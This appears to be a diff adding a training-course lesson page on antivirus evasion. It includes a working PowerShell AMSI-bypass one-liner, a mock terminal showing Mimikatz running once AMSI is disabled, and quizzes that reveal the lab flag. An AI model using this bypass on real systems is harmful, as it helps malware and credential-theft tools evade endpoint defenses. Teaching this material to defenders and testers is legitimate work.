@@ -1,0 +1,56 @@
+# Antivirus Evasion
+
+Your exploit is perfect, but Windows Defender eats it.
+You need to evade detection (FUD - Fully Undetectable).
+
+## Techniques
+
+1.  **Obfuscation:** Changing the variable names and logic flow to confuse the signature scanner.
+2.  **Encoding:** Encrypting the shellcode (e.g., Shikata Ga Nai, XOR) and decrypting it in memory.
+3.  **Living off the Land (LotL):** Using built-in tools (PowerShell, CertUtil) to download/run malware.
+
+## Lab: AMSI Bypass
+
+Antimalware Scan Interface (AMSI) stops PowerShell scripts.
+But it runs in the same memory space as your script... so you can patch it out.
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+By forcing AMSI to fail initialization, it turns off.
+
+<TerminalWindow 
+  cmd="PowerShell > Invoke-Mimikatz" 
+  output="ERROR: Script contains malicious content. Blocked by Antivirus.
+  
+PowerShell > [Bypass Command Executed]
+PowerShell > Invoke-Mimikatz
+  .#####.   mimikatz 2.2.0 (x64)
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##  Benjamin DELPY `gentilkiwi`
+ '## v ##'  
+  '#####'   
+Flag: BL{AMS1_Byp4ss_Succe55}" 
+/>
+
+<Quiz 
+  question="What does FUD stand for in malware development?"
+  options={[
+    "Fully Undetectable",
+    "File Upload Download",
+    "Fast User Data",
+    "Fixed Unix Daemon"
+  ]}
+/>
+
+<Quiz 
+  question="What is the flag found after bypassing AMSI?"
+  options={[
+    "BL{AMS1_Byp4ss_Succe55}",
+    "BL{D3f3nd3r_D1sabl3d}",
+    "mimikatz",
+    "gentilkiwi"
+  ]}
+/>
